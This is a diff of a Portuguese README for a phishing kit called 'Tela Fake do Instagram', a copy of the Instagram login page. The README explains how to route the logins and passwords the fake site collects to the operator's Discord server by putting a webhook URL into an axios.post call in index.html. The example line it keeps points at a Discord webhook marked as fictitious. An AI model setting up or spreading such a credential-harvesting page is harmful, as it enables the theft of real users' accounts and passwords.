@@ -6,7 +6,6 @@ A **Tela Fake do Instagram** nada mais seria **um site identico ao site oficial*
 
 - **Para receber o login, senha & outros coletado pelo Site Falso, é preciso ter um Servidor dentro do Discord**.
 - **Abra o `index.html` e troque o exemplo pela sua `Webhook Válida.` Exemplo**:
-  - `const response = await axios.post('COLOQUE SUA WEBHOOK', data);`
   - `const response = await axios.post('https://discord.com/api/webhooks/exemplo/1nsaneqy', data);` `(Webhook Fictícia)`
   - **Este código acima poderá ser encontrado na linha ``258``**.
 
